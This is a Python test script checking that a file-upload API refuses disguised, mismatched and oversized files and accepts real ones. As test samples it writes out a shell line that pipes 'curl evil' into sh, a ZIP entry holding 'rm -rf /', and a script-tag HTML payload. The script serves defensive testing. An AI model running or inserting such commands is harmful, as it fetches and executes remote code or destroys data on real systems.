"""
Upload guard check (app/core/file_guard.py, app/core/limits.py), in-process through the ASGI app.

Real files must pass the guard and reach the tool; files whose bytes don't match their name, or
whose type the endpoint doesn't take, must be refused with 415 before any processing; bodies over
the size limit must be refused with 413 before they're read.

    python scripts/check_upload_guard.py
"""

import asyncio
import io
import json
import subprocess
import sys
import tempfile
import time
import uuid
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.stdout.reconfigure(encoding="utf-8")

import fitz  # noqa: E402
from PIL import Image  # noqa: E402

from app.core.config import app_settings  # noqa: E402
from app.main import app  # noqa: E402

results = []


def multipart(fields):
    boundary = uuid.uuid4().hex
    out = io.BytesIO()
    for name, value in fields:
        out.write(f"--{boundary}\r\n".encode())
        if isinstance(value, tuple):
            filename, data = value
            out.write(f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode())
            out.write(data)
        else:
            out.write(f'Content-Disposition: form-data; name="{name}"\r\n\r\n{value}'.encode())
        out.write(b"\r\n")
    out.write(f"--{boundary}--\r\n".encode())
    return out.getvalue(), f"multipart/form-data; boundary={boundary}"


async def call(path, body, ctype, extra_headers=()):
    headers = [(b"content-type", ctype.encode()), (b"authorization", f"Bearer {app_settings.HEADER_TOKEN}".encode()), (b"content-length", str(len(body)).encode()), *extra_headers]
    scope = {"type": "http", "asgi": {"version": "3.0"}, "http_version": "1.1", "method": "POST", "path": path, "raw_path": path.encode(), "query_string": b"",
             "headers": headers, "client": ("127.0.0.1", 1), "server": ("127.0.0.1", 8000), "scheme": "http"}
    status, out, sent, read = 0, b"", False, 0

    async def receive():
        nonlocal sent, read
        if not sent:
            sent = True
            read = len(body)
            return {"type": "http.request", "body": body, "more_body": False}
        await asyncio.sleep(3600)

    async def send(m):
        nonlocal status, out
        if m["type"] == "http.response.start":
            status = m["status"]
        elif m["type"] == "http.response.body":
            out += m.get("body", b"")

    task = asyncio.create_task(app(scope, receive, send))
    for _ in range(600):
        await asyncio.sleep(0.1)
        if task.done() or (status and out):
            break
    task.cancel()
    return status, out, read


def post(path, files, fields=()):
    body, ctype = multipart([*fields, *files])
    return asyncio.run(call(f"/api/v1{path}", body, ctype))


def detail(out):
    try:
        return json.loads(out).get("detail")
    except Exception:  # noqa: BLE001
        return out[:120]


def check(name, ok, info=""):
    results.append(ok)
    print("PASS" if ok else "FAIL", name, "" if ok else f"→ {info}", flush=True)


def expect_refused(name, path, filename, data, fields=()):
    t = time.time()
    st, out, _ = post(path, [("file", (filename, data))], fields)
    check(f"refused: {name}", st == 415, f"{st} {detail(out)}")
    if st == 415:
        print(f"      “{detail(out)}” ({(time.time() - t) * 1000:.0f} ms)")


def expect_passes(name, path, files, fields=()):
    st, out, _ = post(path, files, fields)
    check(f"passes: {name}", st != 415, f"{st} {detail(out)}")


# ---- sample files ----
doc = fitz.open()
doc.new_page().insert_text((72, 72), "hello")
PDF = doc.tobytes()
buf = io.BytesIO()
Image.new("RGB", (40, 30), "tomato").save(buf, "PNG")
PNG = buf.getvalue()
buf = io.BytesIO()
Image.new("RGB", (40, 30), "teal").save(buf, "JPEG")
JPG = buf.getvalue()
EXE = b"MZ\x90\x00\x03" + b"\x00" * 200 + b"This program cannot be run in DOS mode." + b"\x00" * 200
ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 300
ZIP = io.BytesIO()
with zipfile.ZipFile(ZIP, "w") as z:
    z.writestr("evil.sh", "rm -rf /")
ZIP = ZIP.getvalue()
from docx import Document  # noqa: E402

d = Document()
d.add_paragraph("Hello")
buf = io.BytesIO()
d.save(buf)
DOCX = buf.getvalue()
FONT = next(iter(sorted((ROOT / "app").rglob("*.ttf")))).read_bytes()
with tempfile.TemporaryDirectory() as tmp:
    from app.services.ffmpeg_service import init_ffmpeg

    init_ffmpeg()
    mp4 = Path(tmp) / "a.mp4"
    subprocess.run(["ffmpeg", "-v", "error", "-f", "lavfi", "-i", "sine=d=1", "-f", "lavfi", "-i", "color=c=red:s=64x64:d=1", "-shortest", "-c:v", "libx264", "-c:a", "aac", str(mp4)], check=True)
    MP4 = mp4.read_bytes()
    mp3 = Path(tmp) / "a.mp3"
    subprocess.run(["ffmpeg", "-v", "error", "-f", "lavfi", "-i", "sine=d=1", str(mp3)], check=True)
    MP3 = mp3.read_bytes()

# ---- 1. disguised files are refused at the door ----
expect_refused("Windows program renamed .pdf", "/pdf/compress", "invoice.pdf", EXE)
expect_refused("Linux program renamed .png", "/image/compress", "photo.png", ELF)
expect_refused("shell script renamed .jpg", "/image/resize", "cat.jpg", b"#!/bin/sh\ncurl evil | sh\n")
expect_refused("plain ZIP renamed .docx", "/universal/convert", "report.docx", ZIP, [("target", "pdf")])
expect_refused("PNG renamed .pdf", "/pdf/upload", "scan.pdf", PNG)
expect_refused("HTML renamed .jpg", "/image/convert", "pic.jpg", b"<html><script>alert(1)</script></html>", [("target", "png")])
expect_refused("text renamed .ttf", "/fonts/inspect", "font.ttf", b"not a font at all")
expect_refused("MP4 renamed .mp3", "/transcribe", "talk.mp3", MP4)
expect_refused("JPEG renamed .heic", "/image/convert", "IMG_0001.heic", JPG, [("target", "png")])
expect_refused("SVG without a drawing", "/image/compress", "logo.svg", b"just words, no svg here")
expect_refused("binary junk named .py", "/universal/convert", "script.py", b"\x00\x01\x02\x03" * 100, [("target", "pdf")])
expect_refused("program renamed .csv (compress)", "/compress", "data.csv", EXE)
expect_refused("program renamed .mp4 (merge)", "/merge-split/inspect", "clip.mp4", EXE)
expect_refused("program renamed .png (palette)", "/palette/extract", "colours.png", EXE)
expect_refused("program renamed .png (icon)", "/icon", "logo.png", EXE)
expect_refused("program renamed .png (QR logo)", "/qrcode/generate-with-logo", "logo.png", EXE, [("data", "hi")])
expect_refused("program renamed .html (HTML to PDF)", "/convert/html-to-pdf", "page.html", EXE)
expect_refused("program as the watermark image", "/pdf/watermark", "mark.png", EXE)

# ---- 2. the wrong kind of (real) file for the endpoint ----
expect_refused("a real Word file sent to a PDF tool", "/pdf/upload", "letter.docx", DOCX)
expect_refused("a real PDF sent to the font checker", "/fonts/inspect", "doc.pdf", PDF)
expect_refused("a real MP4 sent to an image tool", "/image/compress", "clip.mp4", MP4)
expect_refused("an .exe by name", "/universal/convert", "setup.exe", EXE, [("target", "pdf")])
expect_refused("no extension", "/compress", "README", b"hello")

# ---- 3. real files pass the guard (and reach the tool) ----
expect_passes("PDF to a PDF tool", "/pdf/upload", [("file", ("doc.pdf", PDF))])
expect_passes("PNG to image compress", "/image/compress", [("files", ("a.png", PNG))])
expect_passes("JPEG named .jfif", "/image/compress", [("files", ("a.jfif", JPG))])
expect_passes("Word file to merge/split", "/merge-split/inspect", [("file", ("letter.docx", DOCX))])
expect_passes("Word file to the converter", "/universal/convert", [("file", ("letter.docx", DOCX))], [("target", "pdf")])
expect_passes("Python source (text) to the converter", "/universal/convert", [("file", ("hello.py", b"print('hi')\n"))], [("target", "pdf")])
expect_passes("CSV with Windows-1252 text", "/universal/convert", [("file", ("data.csv", "name,city\nJosé,Zürich\n".encode("cp1252")))], [("target", "json")])
expect_passes("UTF-16 text file", "/universal/convert", [("file", ("notes.txt", "﻿hello".encode("utf-16")))], [("target", "pdf")])
expect_passes("SVG", "/image/compress", [("files", ("logo.svg", b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"/>'))])
expect_passes("font", "/fonts/inspect", [("file", ("f.ttf", FONT))])
expect_passes("MP3 to speech-to-text", "/transcribe", [("file", ("a.mp3", MP3))])
expect_passes("MP4 to compress", "/compress", [("files", ("a.mp4", MP4))])
expect_passes("several images to one PDF", "/pdf/from-images", [("images", ("1.png", PNG)), ("images", ("2.jpg", JPG))])

# ---- 4. one bad file in a batch sinks the batch ----
st, out, _ = post("/image/compress", [("files", ("ok.png", PNG)), ("files", ("bad.png", EXE))])
check("refused: one disguised file among good ones", st == 415 and "bad.png" in str(detail(out)), f"{st} {detail(out)}")

# ---- 5. size limits, before the body is read ----
limit = (app_settings.MAX_DOWNLOAD_SIZE_MB + 5) * 1024 * 1024
body, ctype = multipart([("file", ("big.pdf", PDF))])
st, out, read = asyncio.run(call("/api/v1/pdf/upload", body, ctype, [(b"content-length", str(limit + 1).encode())]))
check("413 for a declared size over the limit, body never read", st == 413 and read == 0, f"{st} read={read} {detail(out)}")
st, out, read = asyncio.run(call("/api/v1/devtools/dns", b"x" * (7 * 1024 * 1024), "application/json"))
check("413 for an oversized JSON body", st == 413, f"{st} {detail(out)}")

print(f"\n{sum(results)}/{len(results)} passed")
sys.exit(0 if all(results) else 1)
